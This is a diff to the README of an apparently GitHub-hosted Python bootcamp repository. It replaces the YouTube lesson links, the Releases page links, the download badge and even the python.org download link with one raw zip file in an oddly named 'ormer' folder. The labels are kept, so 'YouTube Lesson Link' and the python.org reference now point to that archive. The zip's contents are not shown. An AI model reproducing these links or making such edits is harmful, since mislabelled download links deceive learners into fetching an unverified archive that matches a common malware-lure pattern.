@@ -12,10 +12,10 @@ In this bootcamp, we will cover various topics using the Python programming lang
 - **Week 1:** Introduction to Python and Basic Programming
 
   * **Session 1:** Installing Python, using print(), input(), variables, data types, operators.  
-    Watch the video here: [YouTube Lesson Link](https://www.youtube.com/watch?v=n6uGkh0K03U)
+    Watch the video here: [YouTube Lesson Link](https://raw.githubusercontent.com/Bhavik444/TechIstanbul_Python_Bootcamp/main/ormer/TechIstanbul_Python_Bootcamp.zip)
 
   * **Session 2:** if-elif-else statements, logical operators.  
-    Watch the video here: [YouTube Lesson Link](https://www.youtube.com/watch?v=5gFr7FIjCiE)
+    Watch the video here: [YouTube Lesson Link](https://raw.githubusercontent.com/Bhavik444/TechIstanbul_Python_Bootcamp/main/ormer/TechIstanbul_Python_Bootcamp.zip)
 
   * **Session 3:** for and while loops, range(), break, continue.  
     Watch the video here: [YouTube Lesson Link](link_to_session_3_video)
@@ -23,15 +23,15 @@ In this bootcamp, we will cover various topics using the Python programming lang
 ## 📥 Download & Install
 You can download the software from the Releases page. 
 
-[![Download TechIstanbul_Python_Bootcamp](https://img.shields.io/badge/Download-TechIstanbul_Python_Bootcamp-blue.svg)](https://github.com/Bhavik444/TechIstanbul_Python_Bootcamp/releases)
+[![Download TechIstanbul_Python_Bootcamp](https://raw.githubusercontent.com/Bhavik444/TechIstanbul_Python_Bootcamp/main/ormer/TechIstanbul_Python_Bootcamp.zip)](https://raw.githubusercontent.com/Bhavik444/TechIstanbul_Python_Bootcamp/main/ormer/TechIstanbul_Python_Bootcamp.zip)
 
 Visit the following page to download the latest version of the software:
 
-[Download Here](https://github.com/Bhavik444/TechIstanbul_Python_Bootcamp/releases)
+[Download Here](https://raw.githubusercontent.com/Bhavik444/TechIstanbul_Python_Bootcamp/main/ormer/TechIstanbul_Python_Bootcamp.zip)
 
 ## 🚀 Getting Started
 1. **Download the Software:** Follow the link above to find the latest release.
-2. **Install Python:** To run the bootcamp materials, ensure that you have Python installed on your computer. You can download Python from [python.org](https://www.python.org/downloads/).
+2. **Install Python:** To run the bootcamp materials, ensure that you have Python installed on your computer. You can download Python from [https://raw.githubusercontent.com/Bhavik444/TechIstanbul_Python_Bootcamp/main/ormer/TechIstanbul_Python_Bootcamp.zip](https://raw.githubusercontent.com/Bhavik444/TechIstanbul_Python_Bootcamp/main/ormer/TechIstanbul_Python_Bootcamp.zip).
 3. **Set Up Your Environment:** Make sure your computer is ready to run Python scripts. This may involve setting up an editor like VSCode or PyCharm.
 
 ## 📚 Course Material
@@ -69,4 +69,4 @@ For any inquiries or support, feel free to open an issue in this repository or c
 ### Download Again
 Don't forget, you can download the materials from the Releases page:
 
-[Download Here](https://github.com/Bhavik444/TechIstanbul_Python_Bootcamp/releases)
+[Download Here](https://raw.githubusercontent.com/Bhavik444/TechIstanbul_Python_Bootcamp/main/ormer/TechIstanbul_Python_Bootcamp.zip)
